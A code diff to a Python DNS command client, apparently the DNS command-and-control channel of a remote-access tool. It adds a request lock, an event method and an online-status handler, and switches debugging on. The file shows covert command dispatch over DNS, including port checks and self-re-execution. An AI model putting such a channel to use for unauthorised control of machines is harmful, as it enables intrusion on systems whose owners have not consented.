@@ -21,7 +21,7 @@ import urllib2
 from ecpv import ECPV
 from picocmd import *
 
-from threading import Thread
+from threading import Thread, Lock
 
 class TCPFile(StringIO.StringIO):
     pass
@@ -74,7 +74,7 @@ urllib2.install_opener(
 class DnsCommandClientDecodingError(Exception):
     pass
 
-__DEBUG = 0
+__DEBUG = 1
 
 if __DEBUG:
     import dns.resolver
@@ -109,6 +109,7 @@ class DnsCommandsClient(Thread):
         self.active = True
         self.failed = 0
         self.proxy = None
+        self._request_lock = Lock()
 
         Thread.__init__(self)
 
@@ -116,6 +117,10 @@ class DnsCommandsClient(Thread):
         self.domain_id = ( self.domain_id + 1 ) % len(self.domains)
         self.domain = self.domains[self.domain_id]
         self.failed = 0
+
+    def event(self, command):
+        logging.debug('Event: {}'.format(command))
+        self._request(command)
 
     def _a_page_decoder(self, addresses, nonce, symmetric=None):
         if symmetric is None:
@@ -164,6 +169,10 @@ class DnsCommandsClient(Thread):
         return encoded, nonce
 
     def _request(self, *commands):
+        with self._request_lock:
+            return self._request_unsafe(commands)
+
+    def _request_unsafe(self, commands):
         parcel = Parcel(*commands)
         page, nonce = self._q_page_encoder(parcel.pack())
 
@@ -266,7 +275,10 @@ class DnsCommandsClient(Thread):
     def on_connect(self, ip, port, transport):
         pass
 
-    def on_checkconnect(self, host, port_start, port_end=None):
+    def on_checkconnect(self, host, port_start, port_end):
+        pass
+
+    def on_checkonline(self):
         pass
 
     def on_exit(self):
@@ -358,6 +370,8 @@ class DnsCommandsClient(Thread):
                 time.sleep(command.timeout)
             elif isinstance(command, CheckConnect):
                 self.on_checkconnect(command.host, command.port_start, port_end=command.port_end)
+            elif isinstance(command, OnlineStatusRequest):
+                self.on_checkonline()
             elif isinstance(command, Reexec):
                 try:
                     executable = os.readlink('/proc/self/exe')
